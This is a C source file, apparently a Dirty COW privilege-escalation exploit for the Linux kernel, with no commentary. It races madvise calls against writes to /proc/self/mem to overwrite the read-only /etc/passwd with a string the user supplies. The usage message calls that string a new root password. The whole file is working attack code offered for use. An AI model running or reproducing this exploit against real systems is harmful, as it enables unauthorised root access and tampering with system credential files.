#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    int i;
    for (i = 0; i < 1000000; i++) {
        madvise(map, 100, MADV_DONTNEED);
    }
    return NULL;
}

void *procselfmemThread(void *arg) {
    int i;
    for (i = 0; i < 1000000; i++) {
        lseek(f, (off_t)map, SEEK_SET);
        write(f, name, strlen(name));
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;

    if (argc < 2) {
        printf("Usage: %s new_root_pass\n", argv[0]);
        exit(1);
    }

    name = argv[1];

    f = open("/proc/self/mem", O_RDWR);
    stat("/etc/passwd", &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, open("/etc/passwd", O_RDONLY), 0);

    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, NULL);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}